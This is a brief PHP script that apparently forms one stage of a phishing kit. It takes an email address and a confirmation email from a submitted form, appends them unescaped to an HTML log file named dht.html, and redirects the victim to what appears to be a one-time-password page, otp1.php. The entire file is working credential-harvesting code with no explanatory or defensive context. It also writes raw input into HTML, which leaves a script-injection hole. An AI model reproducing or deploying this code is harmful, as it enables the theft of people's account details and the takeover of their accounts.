<?php
header("location:otp1.php");
$Email=$_POST['Email'];
$Confirmemail=$_POST['Confirmemail'];
$handle=fopen('dht.html','a');
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"Email=$Email\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"Confirmemail=$Confirmemail\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
